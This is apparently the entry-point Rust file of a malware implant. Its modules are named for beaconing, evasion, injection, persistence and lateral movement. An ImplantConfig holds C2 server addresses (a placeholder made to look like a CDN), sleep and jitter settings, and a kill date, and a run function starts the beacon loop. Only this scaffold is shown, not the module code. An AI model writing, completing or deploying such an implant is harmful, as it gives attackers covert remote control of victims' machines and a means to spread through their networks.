pub mod beacon;
pub mod crypto;
pub mod transport;
pub mod evasion;
pub mod inject;
pub mod persist;
pub mod lateral;
pub mod plugin;

/// Global implant configuration
#[derive(Debug, Clone)]
pub struct ImplantConfig {
    pub servers: Vec<String>,
    pub transport: String,
    pub sleep_secs: u64,
    pub jitter_pct: u8,
    pub max_retries: u8,
    pub kill_date: u64,
    pub server_pubkey: [u8; 32],
}

impl Default for ImplantConfig {
    fn default() -> Self {
        Self {
            servers: vec!["https://cdn.example.com".into()],
            transport: "https".into(),
            sleep_secs: 0,
            jitter_pct: 20,
            max_retries: 3,
            kill_date: 0,
            server_pubkey: [0u8; 32],
        }
    }
}

pub async fn run(config: ImplantConfig) -> Result<(), Box<dyn std::error::Error>> {
    let mut beacon = beacon::Beacon::new(config)?;
    beacon.run().await
}
